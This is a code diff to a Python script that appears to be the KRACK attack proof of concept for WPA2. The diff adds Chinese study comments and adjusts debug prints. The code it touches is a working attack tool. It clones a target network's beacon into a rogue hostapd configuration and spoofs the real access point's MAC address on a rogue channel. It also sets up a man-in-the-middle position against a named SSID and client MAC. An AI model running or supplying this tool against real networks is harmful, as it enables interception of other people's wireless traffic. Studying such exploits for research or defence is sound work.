@@ -149,6 +149,7 @@ def call_macchanger(iface, macaddr):
 		subprocess.check_output(["macchanger", "-m", macaddr, iface])
 	except subprocess.CalledProcessError as err:
 		if not "It's the same MAC!!" in err.output.decode():
+			print(err.output.decode())
 			raise
 
 def set_mac_address(iface, macaddr):
@@ -294,6 +295,7 @@ def print_rx(level, name, p, color=None, suffix=None):
 	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
 	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
 
+# 紀錄網路的config
 class NetworkConfig():
 	def __init__(self):
 		self.ssid = None
@@ -304,15 +306,16 @@ class NetworkConfig():
 		self.akms = set()
 		self.wmmenabled = 0
 		self.capab = 0
-
+		
+	# 檢查 beacon frame MAC層是否包含RSNE訊息，沒有就代表非使用RSN網路(為WEP)
 	def is_wparsn(self):
 		return not self.group_cipher is None and self.wpavers > 0 and \
 			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0
 
 	# TODO: Improved parsing to handle more networks
+	# 解析 RSN 內容
 	def parse_wparsn(self, wparsn):
-		print('308: ', end='')
-		print(type(wparsn))
+		# 群組加密演算法
 		self.group_cipher = ord(wparsn.decode('unicode_escape')[5])
 
 		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
@@ -333,8 +336,6 @@ class NetworkConfig():
 	def from_beacon(self, p):
 		el = p[Dot11Elt]
 		while isinstance(el, Dot11Elt):
-			print('329: ', end='')
-			print(el.info.decode('unicode_escape'))
 			if el.ID == IEEE_TLV_TYPE_SSID:
 				self.ssid = el.info.decode('unicode_escape')
 			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
@@ -353,8 +354,10 @@ class NetworkConfig():
 	# TODO: Check that there also isn't a real AP of this network on 
 	# the returned channel (possible for large networks e.g. eduroam).
 	def find_rogue_channel(self):
+		# 強盜 AP 頻道不是在 1 就是 11
 		self.rogue_channel = 1 if self.real_channel >= 6 else 11
-
+	
+	# hostapd.confg寫檔 
 	def write_config(self, iface):
 		TEMPLATE = """
 ctrl_interface=/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl
@@ -883,21 +886,19 @@ class KRAckAttack():
 		# 4. Finally put the interfaces up
 		subprocess.check_output(["ifconfig", self.nic_real, "up"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
-
+	
+	# 主要執行 func.
 	def run(self, strict_echo_test=False):
 		self.configure_interfaces()
 
-		# Make sure to use a recent backports driver package so we can indeed
-		# capture and inject packets in monitor mode.
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
-
-		# Test monitor mode and get MAC address of the network
+		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
 		self.find_beacon(self.ssid)
 		if self.beacon is None:
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
 			return
-		# Parse beacon and used this to generate a cloned hostapd.conf
+		# 將 wifi ap 的 beacon 訊息紀錄，用來產生 hostapd.conf
 		self.netconfig = NetworkConfig()
 		self.netconfig.from_beacon(self.beacon)
 		if not self.netconfig.is_wparsn():
@@ -909,15 +910,14 @@ class KRAckAttack():
 
 		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
 		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
-
-		# Set the MAC address of the rogue hostapd AP
+		# 將強盜 AP 的 MAC addr. 設成原始 AP 的 MAC addr.
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
 		if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
 
-		# Set BFP filters to increase performance
+		# FIXME: Set BFP filters to increase performance, can't set suceessful.
 		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
 		if self.clientmac:
 			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
@@ -958,6 +958,7 @@ class KRAckAttack():
 		nextbeacon = time.time() + 0.01
 		while True:
 			sel = select.select([self.sock_rogue, self.sock_real, self.hostapd.stdout], [], [], 0.1)
+			print(sel)
 			if self.sock_real      in sel[0]: self.handle_rx_realchan()
 			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()
 			if self.hostapd.stdout in sel[0]: self.handle_hostapd_out()
@@ -1005,13 +1006,12 @@ if __name__ == "__main__":
 		  - Uses CSA beacons to obtain channel-based MitM position
 		  - Can detect and handle wpa_supplicant all-zero key installations""")
 	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
-
-	# Required arguments
+	# 必要的參數
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
 	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 
-	# Optional arguments
+	# 選擇性參數
 	parser.add_argument("-m", "--nic-rogue-mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
 	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
 	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
